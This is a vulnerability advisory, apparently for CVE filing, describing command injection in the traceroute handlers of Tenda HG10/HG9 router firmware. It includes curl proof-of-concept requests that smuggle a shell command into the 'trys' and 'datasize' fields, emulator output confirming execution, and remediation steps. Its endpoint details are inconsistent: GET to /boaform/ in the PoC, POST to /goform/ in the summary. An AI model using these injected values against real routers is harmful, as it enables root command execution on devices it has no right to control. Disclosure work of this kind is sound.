# Tenda HG10/HG9 V3.3.0-250113 was discovered to contain a command injection vulnerability in formTracert and formTracert6

## Overview

- Vendor: Tenda
- Product: HG10/HG9 (HG7_HG9_HG10 family)
- Version: V3.3.0-250113
- Component: Boa formTracert and formTracert6
- Vulnerability Class: CWE-78 command injection
- Manufacturer: https://www.tendacn.com/

## Affected version

- Package `HG7_HG9_HG10re_300001138.zip`.
- `boa`.

## Vulnerability details

`formTracert` and `formTracert6` pass the `trys`, `timeout`, `maxhop` and `datasize` parameters into a `/bin/sh -c traceroute ...` command without `atoi`, length, or character validation. `;`, backticks, and `$()` are accepted. Both handlers share the same code path. The endpoint requires an admin session; Tenda Boa has no CSRF token, so admin-CSRF is plausible.

## PoC

```sh
curl -sS -i -G \
  --data-urlencode 'traceAddr=127.0.0.1' \
  --data-urlencode 'trys=1;echo TRACERT_PWN>/dev/console;#' \
  http://<router>/boaform/formTracert

# IPv6 variant:
curl -sS -i -G \
  --data-urlencode 'traceAddr=::1' \
  --data-urlencode 'trys=1;echo TRACERT6_PWN>/dev/console;#' \
  http://<router>/boaform/formTracert6
```

## Reproduction and terminal evidence

Environment: qemu-user HG10/HG9 chroot; only `auth_authorize` was patched to
return 1. `formTracert` and `va_cmd` are unchanged.

Terminal transcript:

```
$ curl -sS -i -G --data-urlencode 'traceAddr=127.0.0.1' \
    --data-urlencode 'trys=1;echo TRACERT_PWN>/dev/console;#' \
    http://127.0.0.1/boaform/formTracert
HTTP/1.0 301 Moved Permanently
Location: /tracert_result.asp
$ cat /dev/console
TRACERT_PWN
$ curl ... formTracert6 ... 'trys=1;echo TRACERT6_PWN>/dev/console;#'
TRACERT6_PWN
```

`datasize=1;echo TRACERT_DATASIZE>/dev/console;#` also executes. Evidence:
`evidence/dynamic-response-tracert*.txt`, `evidence/dynamic-console-*.txt`
(parent project).

## Static evidence

The decompilation shows `snprintf`/`sprintf` building the traceroute command
with the raw parameters and a `system` call; no validation is present. See
`evidence/ida-formTracert.txt` (parent project).

## Impact

Authenticated admin (or CSRF) root command execution.

## Remediation

- Parse numeric fields with `atoi`/`strtol` and enforce ranges.
- Use `execve`/argv for traceroute; do not build a shell command line.
- Add CSRF tokens to state-changing Boa handlers.

## Known CVE relation

**CVE candidate type: new affected model (HG10/HG9 2025) for formTracert — candidate new CVE.**

- CVE-2026-7160 covers Tenda HG3 `formTracert` `datasize`; this is the
  HG10/HG9 2025 `trys`/`datasize` path. NVD HG10 `formTracert` returns 0
  records (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-user, auth-bypass test image; handler unchanged).
Candidate new CVE — new affected model (HG10/HG9 2025) for formTracert; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
HG10/HG9 (HG7_HG9_HG10 family)

### Version or Commit
V3.3.0-250113

### Vulnerability Class
CWE-78 command injection

### CVE_candidate_type
new affected model (HG10/HG9 2025) for formTracert — candidate new CVE

### Description
formTracert and formTracert6 pass trys, timeout, maxhop and datasize into /bin/sh -c traceroute without atoi, length or character validation; ;, backticks and $() are accepted.

### Affected_component
Boa formTracert and formTracert6

### Attack_vector
Authenticated POST to /goform/formTracert or formTracert6 with crafted numeric fields.

### Product_version
HG10/HG9 (HG7_HG9_HG10 family) V3.3.0-250113

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/HG10_HG9_V3.3.0-250113/report-2.md
```
